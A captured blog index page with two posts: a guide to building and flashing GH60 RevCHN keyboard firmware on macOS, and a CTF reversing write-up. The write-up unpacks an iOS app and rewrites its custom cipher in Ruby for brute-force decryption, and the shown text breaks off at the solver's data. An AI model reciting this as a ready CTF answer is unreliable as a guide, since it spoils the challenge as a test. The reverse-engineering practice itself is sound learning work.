
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>blog.dm4.tw</title>
  <meta name="author" content="dm4">

  
  <meta name="description" content="來記錄一下在 Mac OSX 上，怎麼編譯和刷 GH60 RevCHN 的韌體 參考資料 http://www.v2ex.com/t/161887
https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html
https://www.ptt. &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.dm4.tw">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blog.dm4.tw" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<!-- Social media content metadata -->

<meta property="fb:admins" content="1360542987" />
<meta property="og:title" content="blog.dm4.tw" />
<meta property="og:site_name" content="blog.dm4.tw" />
<meta property="og:url" content="http://blog.dm4.tw/" />
<meta property="og:description" content="來記錄一下在 Mac OSX 上，怎麼編譯和刷 GH60 RevCHN 的韌體 參考資料 http://www.v2ex.com/t/161887
https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html
https://www.ptt.cc/bbs/Key_Mou_Pad/M.1390542876.A.073.html 步驟 根據 &hellip;" />
<meta property="og:image" content="http://www.gravatar.com/avatar/1b0b7bab4c837d80e1b110bd7127a0d8?s=200" />
<meta property="og:type" content="website" />


  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-31586582-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blog.dm4.tw</a></h1>
  
    <h2>dm4's blog</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:blog.dm4.tw" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/03/17/build-gh60-revchn-on-mac/">在 Mac OSX 上編譯 GH60 RevCHN Firmware</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-03-17T22:49:00+08:00" pubdate data-updated="true">Mar 17<span>th</span>, 2015</time>
        
           | <a href="/blog/2015/03/17/build-gh60-revchn-on-mac/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2015/03/17/build-gh60-revchn-on-mac/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>來記錄一下在 Mac OSX 上，怎麼編譯和刷 GH60 RevCHN 的韌體</p>

<h3>參考資料</h3>

<ul>
<li><a href="http://www.v2ex.com/t/161887">http://www.v2ex.com/t/161887</a></li>
<li><a href="https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html">https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html</a></li>
<li><a href="https://www.ptt.cc/bbs/Key_Mou_Pad/M.1390542876.A.073.html">https://www.ptt.cc/bbs/Key_Mou_Pad/M.1390542876.A.073.html</a></li>
</ul>


<h3>步驟</h3>

<p>根據 <a href="http://www.v2ex.com/t/161887">http://www.v2ex.com/t/161887</a> 首先要先用 brew 裝crosspack 和 dfu-programmer ，不過因為時間過太久，有點忘記詳細的安裝指令， crosspack 需要 <code>brew tap</code> 的樣子。</p>

<p>裝完之後可以來載 source ，因為 [tmk/tmk_keyboard] 不支援 RevCHN ，所以要用 <a href="https://github.com/kairyu/tmk_keyboard_custom">kairyu/tmk_keyboard_custom</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone https://github.com/kairyu/tmk_keyboard_custom.git</span></code></pre></td></tr></table></div></figure>


<p>需要在 <code>config.h</code> 加上設定，來切換成 GH60 RevCHN</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd keyboard/gh60
</span><span class='line'>vim config.h</span></code></pre></td></tr></table></div></figure>


<p>在檔案裡加上（如果你不確定加在哪，加到 <code>#define CONFIG_H</code> 下面就可以了）</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define GH60_REV_CHN</span></code></pre></td></tr></table></div></figure>


<p>本來以為這樣就可以了，沒想到一直刷失敗，後來看了 <a href="http://www.v2ex.com/t/161887">http://www.v2ex.com/t/161887</a> 和 <a href="https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html">https://www.ptt.cc/bbs/Key_Mou_Pad/M.1426361327.A.EEB.html</a> 兩篇，發現應該是要清空 EEPROM 的問題（可是我硬體知識不足，根本不知道那是什麼啊啊啊）</p>

<p>ptt 那篇的解法是「在插入 usb 前，按住 backspace 與 space 」，不過我有找到 Makefie 裡有個設定，刪掉（註解掉）也是可以的，和大家分享一下：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vim Makefile</span></code></pre></td></tr></table></div></figure>


<p>把下面這行刪掉</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>KEYMAP_IN_EEPROM_ENABLE = yes # Read keymap from eeprom</span></code></pre></td></tr></table></div></figure>


<p>接下來就插上鍵盤，按一下背面的按鈕，直接試刷預設的 poker layout 看看</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>make dfu</span></code></pre></td></tr></table></div></figure>


<p>如果成功，在一堆 <code>avr-gcc</code> 的編譯訊之後，會看到</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dfu-programmer atmega32u4 erase
</span><span class='line'>Checking memory from 0x0 to 0x6FFF...  Not blank at 0x1.
</span><span class='line'>Erasing flash...  Success
</span><span class='line'>Checking memory from 0x0 to 0x6FFF...  Empty.
</span><span class='line'>dfu-programmer atmega32u4 flash gh60_lufa.hex
</span><span class='line'>Checking memory from 0x0 to 0x69FF...  Empty.
</span><span class='line'>0%                            100%  Programming 0x6A00 bytes...
</span><span class='line'>[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]  Success
</span><span class='line'>0%                            100%  Reading 0x7000 bytes...
</span><span class='line'>[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]  Success
</span><span class='line'>Validating...  Success
</span><span class='line'>0x6A00 bytes written into 0x7000 bytes memory (94.64%).
</span><span class='line'>dfu-programmer atmega32u4 reset</span></code></pre></td></tr></table></div></figure>


<p>這樣子最基本的 layout 就成功了，如果不確定是不是真的有刷進去，可以改一下 <code>keymap_poker.c</code> 裡的 layout 看是不是真的刷進去了（例如把 <code>Q</code> 改成 <code>X</code> 之類的）</p>

<p>再來就可以自訂 layout 了，本來想很硬派的直接寫 c code ，不過覺得 code 裡很難排版，最後還是用 <a href="http://www.keyboard-layout-editor.com/">keyboard-layout-editor (KLE)</a> 和 <a href="http://www.enjoyclick.org/tkg/">TMK Keymap Generator (TKG)</a> 來生成 c code ，我用的 layout 是：</p>

<ul>
<li>Layer 0 (Default)

<ul>
<li><a href="http://www.keyboard-layout-editor.com/#/layouts/cc85b037963edc17fe98f84e970e3ca4">http://www.keyboard-layout-editor.com/#/layouts/cc85b037963edc17fe98f84e970e3ca4</a></li>
</ul>
</li>
<li>Layer 1 (Fn1 層)

<ul>
<li><a href="http://www.keyboard-layout-editor.com/#/layouts/243985ccfe04859cdb078166f60cb781">http://www.keyboard-layout-editor.com/#/layouts/243985ccfe04859cdb078166f60cb781</a></li>
</ul>
</li>
<li>Layer 2 (Fn0 層)

<ul>
<li><a href="http://www.keyboard-layout-editor.com/#/layouts/e9453e67d6a099406e002812aaca8687">http://www.keyboard-layout-editor.com/#/layouts/e9453e67d6a099406e002812aaca8687</a></li>
</ul>
</li>
</ul>


<p>然後在 <a href="http://www.enjoyclick.org/tkg/">TKG</a> 上的設定為：</p>

<ul>
<li>Keyboard

<ul>
<li>GH60 (RevCHN)</li>
</ul>
</li>
<li>Layer Mode

<ul>
<li>Normal</li>
</ul>
</li>
<li>Number of Layers

<ul>
<li>3</li>
</ul>
</li>
<li>Fn0

<ul>
<li>Layer action > Momentary layer 2</li>
</ul>
</li>
<li>Fn1

<ul>
<li>Layer action > Toggle layer 1</li>
</ul>
</li>
</ul>


<p>這裡要注意，我把 Fn0 層放在 layer 2 ，是因為 key mapping 會從高層讀到低層，如果把 Fn1 層換到 layer 2 ， Fn0 換到 layer 1 ，這樣子在切到 Fn1 層之後，按著 Fn0 也沒辦法切到 Fn0 層（同樣的問題在 <a href="https://www.ptt.cc/bbs/Key_Mou_Pad/M.1390542876.A.073.html">https://www.ptt.cc/bbs/Key_Mou_Pad/M.1390542876.A.073.html</a> 也有解釋）</p>

<p>接著就在 <a href="http://www.enjoyclick.org/tkg/">TKG</a> 下載 <code>.c</code> 檔，把載下來的 <code>keymap.c</code> 放到資料夾下並改名，就可以準備刷了</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mv ~/Downloads/keymap.c ./keymap_tkg.c
</span><span class='line'>make KEYMAP=tkg dfu</span></code></pre></td></tr></table></div></figure>


<p>這時候如果你看到以下的 error 的話</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keymap_tkg.c:29:78: error: macro "KEYMAP_TKG" requires 62 arguments, but only 61 given
</span><span class='line'>         LCTL,LALT,LGUI,          SPC,                     FN0, RGUI,RALT,RCTL),</span></code></pre></td></tr></table></div></figure>


<p>是因為 <a href="http://www.enjoyclick.org/tkg/">TKG</a> 生 <code>.c</code> 檔的時候好像有 bug ，載下來的檔案，裡面的</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ESC, 1,   2,   3,   4,   5,   6,   7,   8,   9,   0    MINS,EQL, BSPC, \</span></code></pre></td></tr></table></div></figure>


<p><code>0</code> 和 <code>MINS</code> 中間少了 <code>,</code> ，所以改成</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ESC, 1,   2,   3,   4,   5,   6,   7,   8,   9,   0,    MINS,EQL, BSPC, \</span></code></pre></td></tr></table></div></figure>


<p>再編一次應該就 ok 了</p>

<h3>後記</h3>

<p>有一些 Fn action 現在還沒摸熟，看起來可以送 key / macro 的樣子，看到 <a href="https://github.com/kairyu/tmk_keyboard_custom/blob/master/keyboard/hhkb/keymap_hasu.c">https://github.com/kairyu/tmk_keyboard_custom/blob/master/keyboard/hhkb/keymap_hasu.c</a> 有一些 function / macro 的用法還沒研究。</p>

<p>另外雖然編起來了，不過因為底層不熟，還不太清楚架構，希望研究一下之後可以把它和藍牙發射器接起來，之前的 <a href="http://blog.dm4.tw/blog/2014/04/22/convert-usb-keyboard-to-bluetooth-keyboard/">自製 USB 鍵盤轉藍芽鍵盤轉接器</a> 會有點 latency ，不知道如果直接讓 GH60 送訊號給藍牙模組會不會比較好。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100/">SECUINSIDE CTF Finals 2014 Writeup - Reversing 100</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-07-13T15:54:00+08:00" pubdate data-updated="true">Jul 13<span>th</span>, 2014</time>
        
           | <a href="/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2014/07/13/secuinside-2014-final-writeup-reversing-100/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>這題在現場沒解完&hellip;因為覺得應該只差一點點，回來之後果然弄出來了啊！</p>

<figure class='code'><figcaption><span>wooyaggo&#8217;s field</span><a href='https://ctftime.org/task/1174'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>decrypt it and submit 4th line(without last character 0x0a)
</span><span class='line'>
</span><span class='line'>platin text example
</span><span class='line'>1. AAA-111-ASRT-3.1-CC[n]
</span><span class='line'>2. BBB-CCC-ASRT-9.5-DD[n]
</span><span class='line'>
</span><span class='line'>http://dl.ctftime.org/144/1174/59a67b2df52c3e0a1330a5952a619462584bba28
</span><span class='line'>http://dl.ctftime.org/144/1174/enc.txt
</span></code></pre></td></tr></table></div></figure>


<p>第一個連結載下來之後會發現是一個 zip 檔</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ file 59a67b2df52c3e0a1330a5952a619462584bba28
</span><span class='line'>59a67b2df52c3e0a1330a5952a619462584bba28: Zip archive data, at least v1.0 to extract
</span></code></pre></td></tr></table></div></figure>


<p>看了一下內容，會發現是 iOS App 的結構</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ unzip -l 59a67b2df52c3e0a1330a5952a619462584bba28
</span><span class='line'>Archive:  59a67b2df52c3e0a1330a5952a619462584bba28
</span><span class='line'>  Length     Date   Time    Name
</span><span class='line'> --------    ----   ----    ----
</span><span class='line'>        0  07-03-14 13:55   Payload/
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/_CodeSignature/
</span><span class='line'>     3074  07-03-14 13:55   Payload/Inverse.app/_CodeSignature/CodeResources
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/
</span><span class='line'>      258  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/Info.plist
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/
</span><span class='line'>      953  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/objects.nib
</span><span class='line'>      953  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/UIViewController-vXZ-lx-hvc.nib/runtime.nib
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/
</span><span class='line'>     4276  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/objects.nib
</span><span class='line'>     4454  07-03-14 13:55   Payload/Inverse.app/Base.lproj/Main.storyboardc/vXZ-lx-hvc-view-kh9-bI-dsS.nib/runtime.nib
</span><span class='line'>    13944  07-03-14 13:55   Payload/Inverse.app/embedded.mobileprovision
</span><span class='line'>        0  07-03-14 13:55   Payload/Inverse.app/en.lproj/
</span><span class='line'>       42  07-03-14 13:55   Payload/Inverse.app/en.lproj/InfoPlist.strings
</span><span class='line'>     1332  07-03-14 13:55   Payload/Inverse.app/Info.plist
</span><span class='line'>   210368  07-03-14 13:55   Payload/Inverse.app/Inverse
</span><span class='line'>    14929  07-03-14 13:55   Payload/Inverse.app/LaunchImage-568h@2x.png
</span><span class='line'>    14929  07-03-14 13:55   Payload/Inverse.app/LaunchImage-700-568h@2x.png
</span><span class='line'>        8  07-03-14 13:55   Payload/Inverse.app/PkgInfo
</span><span class='line'>      150  07-03-14 13:55   Payload/Inverse.app/ResourceRules.plist
</span><span class='line'> --------                   -------
</span><span class='line'>   269670                   22 files
</span></code></pre></td></tr></table></div></figure>


<p>用 <code>otool</code> 看一下執行檔有沒有被加密</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ otool -l Payload/Inverse.app/Inverse | grep -A5 LC_ENCRYPTION_INFO
</span><span class='line'>          cmd LC_ENCRYPTION_INFO
</span><span class='line'>      cmdsize 20
</span><span class='line'>    cryptoff  16384
</span><span class='line'>    cryptsize 16384
</span><span class='line'>    cryptid   0
</span><span class='line'>Load command 13
</span><span class='line'>--
</span><span class='line'>          cmd LC_ENCRYPTION_INFO
</span><span class='line'>      cmdsize 20
</span><span class='line'>    cryptoff  16384
</span><span class='line'>    cryptsize 16384
</span><span class='line'>    cryptid   0
</span><span class='line'>Load command 13
</span><span class='line'>--
</span><span class='line'>          cmd LC_ENCRYPTION_INFO_64
</span><span class='line'>      cmdsize 24
</span><span class='line'>    cryptoff  16384
</span><span class='line'>    cryptsize 16384
</span><span class='line'>    cryptid   0
</span><span class='line'>        pad   0
</span></code></pre></td></tr></table></div></figure>


<p><code>cryptid</code> 是 0 表示沒有加密，所以我們可以直接來看 <code>Payload/Inverse.app/Inverse</code> ！</p>

<p>看了 code 之後會發現在 <code>[ViewController viewDidLoad]</code> 裡會去讀 <code>/Users/hkpco/tmp/plain.txt</code> ，把檔案的內容當作參數傳給 <code>[ViewController es:]</code> ，在 <code>[ViewController es:]</code> 裡會把 <code>/Users/hkpco/tmp/plain.txt</code> 和 <code>/Users/hkpco/tmp/pass.txt</code> 做一些處理之後，把結果寫到 <code>/Users/hkpco/tmp/enc.txt</code></p>

<p>把整段用 <code>ruby</code> 重寫會長得像</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;digest/sha1&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="ss">Digest</span><span class="p">:</span><span class="ss">:SHA1</span><span class="o">.</span><span class="n">hexdigest</span> <span class="n">i</span><span class="o">.</span><span class="n">to_s</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">h2i</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
</span><span class='line'>  <span class="n">h</span><span class="o">.</span><span class="n">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">all</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
</span><span class='line'>  <span class="n">h</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">map</span><span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">h2i</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">}</span><span class="o">.</span><span class="n">reduce</span><span class="p">(</span><span class="ss">:+</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">es</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">pass</span><span class="p">)</span>
</span><span class='line'>  <span class="n">enc</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>  <span class="nb">hash</span> <span class="o">=</span> <span class="n">s</span><span class="p">(</span><span class="n">pass</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sum</span>  <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="n">.plain</span><span class="o">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">plain</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="n">ord</span> <span class="o">+</span> <span class="n">h2i</span><span class="p">(</span><span class="nb">hash</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">40</span><span class="o">]</span><span class="p">)</span> <span class="o">-</span> <span class="n">sum</span>
</span><span class='line'>    <span class="n">sum</span>    <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.i</span><span class="o">]</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">sum</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="n">enc</span>   <span class="o">+=</span> <span class="n">result</span><span class="o">.</span><span class="n">to_s</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="n">enc</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>所以看到目前為止，我們要做的應該是「只知道 <code>enc</code> ，想辦法推回原本的 <code>plain</code> 」，原本的 <code>pass</code> 是什麼對我們來說不重要，我們只要知道 <code>hash = s(pass)</code> 是什麼就好了！</p>

<p>研究了一下會發現，如果要從 <code>enc</code> 逆推 <code>plain</code> 的話，只要暴搜每一輪的 <code>plain[i]</code> 和 <code>hash[i % 40]</code> ， <code>hash[i % 40]</code> 因為是 hex ，只會有 16 種可能，暴完 40 位的 <code>hash</code> 之後，再看 <code>sum</code> 的起始值有沒有滿足 <code>sum == all(hash)</code> 就可以知道結果了。</p>

<p>比較討厭的是題目給的 <code>1. AAA-111-ASRT-3.1-CC[n]</code> ，真的去試的話會發現用 <code>1.</code> 開頭的 plain 是沒有解的，後面接 <code>[n]</code> 也是一樣，所以最後試出來每行的格式應該是像 <code>[0-9A-Z]{3}-[0-9A-Z]{3}-ASRT-\d\.\d-[0-9A-Z]{2}\n</code>&hellip;解這題的時候因為格式也卡了好久&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="o">[</span>
